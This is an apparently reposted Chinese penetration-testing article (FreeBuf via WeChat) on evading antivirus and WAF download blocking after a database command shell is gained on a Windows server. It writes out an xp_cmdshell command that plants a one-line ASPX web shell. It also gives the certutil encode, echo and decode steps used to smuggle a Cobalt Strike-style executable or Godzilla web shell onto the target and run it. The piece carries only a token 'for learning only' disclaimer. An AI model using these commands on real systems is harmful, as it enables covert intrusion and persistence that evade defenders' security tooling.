<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/rghY4E-923I_T-gUD3UOcA) 文章来源：FreeBuf（耳旁的歌）  

原文地址：

https://www.freebuf.com/articles/network/259671.html

  

**0x01 前言**

**各位在渗透中是否遇见过这个问题：**  

虽然有低权限命令shell，如mssql、postgres等，执行下载总是各种无权限或者被AV杀，轻则无法继续渗透，重则弹出拦截消息，管理员上机后立马发现。

  

本文将介绍一种使用windows自带工具进行编码，写入编码数据到TXT文本最后再解码的骚操作。

  

**0x02 正文**

话不多说，例如这样场景：在数据库连接后或者sqlmap注入连接os-shell后可执行命令。  

![图片](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcyCUM0TjqElL36HORTo7IetK199FYvUrrM7Q6RkoyssW50NiaRE9wDToXGbsATk69xbjMnbZCT8nQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

其中包括杀软或某狗、某盾

![图片](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcyCUM0TjqElL36HORTo7Ie5ggC23I9jestPrjUxyxpbOeVvUjDRoKuKkBQqqJhmtq9OLx5ETxAzA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**此时下载文件的各种命令均被拦截**

bitsadmin：

![图片](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcyCUM0TjqElL36HORTo7IeBq9mmVD3JCS7MbjRsybUBib6ktDOPRbPyyVXRzGaiaomrhKLu0H2WYaw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

certutil证书：

![图片](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcyCUM0TjqElL36HORTo7IemkBGqnVX1micShJtwSEP2MkRu9cZlkz1mBo5IYibm2ScBSIfddYPn8aA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

还会被杀软报警

![图片](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcyCUM0TjqElL36HORTo7IeFibvRqHauq4sqyzdXxtutYbxT0p0Oyw1uCSUNyGiaA02ibFSnFNib1NM9A/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

powershell也会被彻底封杀

![图片](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcyCUM0TjqElL36HORTo7IeFuOR8RichD0MkVDOLfHSnqw8DzSwaoYbQjGfvdAsVOk1ribDFvmLRRjA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

尤其是某管家，拦截更彻底，根本没有倒计时自动消失（此时需要夸一下某大厂的报警提示倒计时功能）

![图片](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcyCUM0TjqElL36HORTo7IepAtzsxiac1Hq56DDDW0ygfib7cLkgLa7VMtVPqqKavLmg1tHm5JPZ2gw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

而在这种环境下可在有权限写入的前提下尝试写入一句话木马

```
xp_cmdshell 'echo  ^<%@ Page Language="Jscript"%^>^<%eval(Request.Item["bmfx"], "unsafe");%^>> D:\\WWW\\bmfx.aspx'
```

  

但也存在被某狗、WAF杀掉的可能，此时，骚操作上场

  

windows自带的证书下载，也就是上文使用但远程下载被拦截的Certutil，还可用来对文件编码解码

```
`本地：``Certutil -encode artifact.exe artifact.txt``或指定路径：``Certutil -encode d:\artifact.exe d:\artifact.txt`
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcyCUM0TjqElL36HORTo7IeibgnMrmREceibSZWRDBj9RUW5ZxDicqt09Qyh87PDCsxUFDNpfcia09jIg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

将txt文本使用echo命令

```
echo sfAFASFAsfasgasdf………>>d:\1.txt
```

  

写入服务器后，进入txt所在目录执行解码（或直接指定物理目录文件）

```
`Certutil -decode art.txt art.exe``或：``Certutil -decode d:\art.txt d:\art.exe`
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcyCUM0TjqElL36HORTo7IeVFN6GXA4pv4oVwAFuvjwu7oelIOzXkyYeLqF9C8UrD09K7H0sia8LBg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

后续可在命令中执行exe上线

```
cmd.exe /c art.exe
```

  

**重点是：**本地解码编码操作不会触发杀软拦截行为！

  

此外，Certutil支持将任意文件编码解码，除了exe还有aspx、php、jsp等（如加密免杀的webshell，此处使用哥斯拉为例）

![图片](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcyCUM0TjqElL36HORTo7Ie8CcIIiaLJ75YyEuJDdyo7ou6icmSicYVDlplzy7EB3ZzAxQZGsqXHlJXg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

可在web站点写入文件后访问txt查看写入有无偏差

![图片](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcyCUM0TjqElL36HORTo7IebvEBlUVAEddt3HWGsu3XBMblicGWmRRHiark08cnwBVYFRgE1wXxvPHw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

还有一点，本人亲测，编码后txt中的文本类似于生成的shellcode，会自动换行显示，但本地替换换行符、自行拆分换行符，不改变内容的前提下，编码、解码前后的文件不会有任何影响。

  

但是在navicat等数据库软件里操作的话还有一个限制，echo的长度会提示不要过长

![图片](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcyCUM0TjqElL36HORTo7Iebicbo8aZ6ibOaScmwOaxCF6HzoSeN2OoIJdgzJ8yn25swAoBWP3xCVSg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

此时就要看各位师傅们在bypass WaF、AV时如何减小体量了，一般cs的马bypass后会在50k左右，使用sqlmap的—os-shell执行echo不会像navicat要求128字符那么短，但也有长度限制，具体各位可亲测。

>精彩回顾<  

[干货 | 红队快速批量打点的利器](http://mp.weixin.qq.com/s?__biz=MzU3MTU3NTY2NA==&mid=2247484374&idx=1&sn=f98119b165319ea399cf3252e5976532&chksm=fcdf5fc9cba8d6df1080aa1d8e86c67bb873bcd40139293f8f63279c2df44946023ed6460cb5&scene=21#wechat_redirect)  

[【干货】最全的Tomcat漏洞复现](http://mp.weixin.qq.com/s?__biz=MzU3MTU3NTY2NA==&mid=2247484175&idx=1&sn=89771c538a529efd108d4a676c093ea7&chksm=fcdf5f10cba8d606f3c2a635b0bb94da11e8978dba2ac4ed9e4debab7a7401ecc8a0f43777b6&scene=21#wechat_redirect)

[{Vulhub漏洞复现（一）ActiveMQ}](http://mp.weixin.qq.com/s?__biz=MzU3MTU3NTY2NA==&mid=2247484055&idx=1&sn=6b71d21065a832cac662dfbd18b9ea09&chksm=fcdf5e88cba8d79ec80b97aadcbe13aef9f4857267018daed4760a582a53d46bb3d3a5f67831&scene=21#wechat_redirect)

[{Vulhub漏洞复现（二） Apereo CAS}](http://mp.weixin.qq.com/s?__biz=MzU3MTU3NTY2NA==&mid=2247484107&idx=1&sn=9467ffe0e276a521f6be0f170941f70d&chksm=fcdf5ed4cba8d7c2d72f3f30a911aa447246bd007f3b647942129d15a2298a3aa494558d4c1c&scene=21#wechat_redirect)

[Cobalt Strike免杀脚本生成器|cna脚本|bypassAV](http://mp.weixin.qq.com/s?__biz=MzU3MTU3NTY2NA==&mid=2247484070&idx=1&sn=d0b1b7bd8687c452ccfa10d11218985e&chksm=fcdf5eb9cba8d7af7059dd9d0de041c2ef5eb7b4986d59fac34f62f5e4b705c42aea4018c318&scene=21#wechat_redirect)

[xss bypass备忘单|xss绕过防火墙技巧|xss绕过WAF的方法  
](http://mp.weixin.qq.com/s?__biz=MzU3MTU3NTY2NA==&mid=2247484076&idx=1&sn=6af2e134ac579e48697f2ee6b7279a4e&chksm=fcdf5eb3cba8d7a5f545a558c13e184c82bf1bb0dd281a4d7ade4e11fa1e647ac447322fe8af&scene=21#wechat_redirect)

[【贼详细 | 附PoC工具】Apache HTTPd最新RCE漏洞复现  
](http://mp.weixin.qq.com/s?__biz=MzU3MTU3NTY2NA==&mid=2247484184&idx=1&sn=f9286573a97bd404e43622c0235aa357&chksm=fcdf5f07cba8d611dc7d8c479b47e312b95194ec5634c6fe46867719bea8de051681dd777558&scene=21#wechat_redirect)

[干货 | 横向移动与域控权限维持方法总汇](http://mp.weixin.qq.com/s?__biz=MzU3MTU3NTY2NA==&mid=2247484308&idx=1&sn=dffaf96b424952c365fd22f733f696f7&chksm=fcdf5f8bcba8d69d58ebaa0da04fbc2b4bf236df6e763d3da4addc097b559f71edfb48ae9712&scene=21#wechat_redirect)

[干货 | 免杀ShellCode加载框架](http://mp.weixin.qq.com/s?__biz=MzU3MTU3NTY2NA==&mid=2247484268&idx=1&sn=cbbcf96a16f4115a277f7b178f58fbfd&chksm=fcdf5f73cba8d6654a8da5bc3c00a6c2997263869f74e7be9316bbc6e4e527e317e999539d4b&scene=21#wechat_redirect)

[【干货】phpMyAdmin漏洞利用汇总](http://mp.weixin.qq.com/s?__biz=MzU3MTU3NTY2NA==&mid=2247484271&idx=1&sn=b07fd5a4b7a0d2430281e76c30cbb4eb&chksm=fcdf5f70cba8d6665a709a2da2bb4ea15751777d3a81818a19d52fe4b5a8306c756f0995bda5&scene=21#wechat_redirect)

[【神兵利器 | 附下载】一个用于隐藏C2的、开箱即用的Tools](http://mp.weixin.qq.com/s?__biz=MzU3MTU3NTY2NA==&mid=2247485199&idx=1&sn=43cd48cf100da8da5f7b750274219123&chksm=fcdf5b10cba8d206d9353ad5009caa882960fb3e09af61e26bc88dafa67ae71b8a7b21ba4f38&scene=21#wechat_redirect)  

[分享 | 个人渗透技巧汇总（避坑）笔记](http://mp.weixin.qq.com/s?__biz=MzU3MTU3NTY2NA==&mid=2247485185&idx=1&sn=a839927c1623655300d93d861bf6e1ad&chksm=fcdf5b1ecba8d2083c582706465f6c5c50e36dcba98853b270350d70c0bc4aa057170fda4d31&scene=21#wechat_redirect)  

![图片](https://mmbiz.qpic.cn/mmbiz_png/vvO7f1bFAvWR5RScYlUsqTtj0TWP0UvTL90icIibdrGQ5jicvqWFo3ZfrDL4HKjjU2dsK0MtNjfRnsMJuXMcUDNibA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

关注我

获得更多精彩

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/vvO7f1bFAvXeWWcDahD1azC3rIvmCAazrRuzG8nwsHc8hAMYprLyibIPabuextzdQp3wvKwice5YbItEEFicN168w/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

  

**坚持学习与分享！走过路过点个"**_**在看**_**"，不会错过**![图片](https://mmbiz.qpic.cn/mmbiz_png/vvO7f1bFAvXK0YKBn7jQKISP37s5SodYRKF6oES11GYF5vuVghuEVwvjicCgIKErKqmCe5xOpYIVbbCJveZFqLg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

**_仅用于学习交流，不得用于非法用途_**

_**如侵权请私聊公众号删文**_

 ![](http://mmbiz.qpic.cn/mmbiz_png/vvO7f1bFAvW90ic51g3v38UXiaz7EebwicyUssn31u8nD4tONLeiavT5Q4ibhibTMF1N3ias5WpdMdXOQ7CWiaz5pWD94w/0?wx_fmt=png) ** EchoSec ** 萌新专注于网络安全行业学习 10篇原创内容   公众号

觉得文章不错给点个‘再看’吧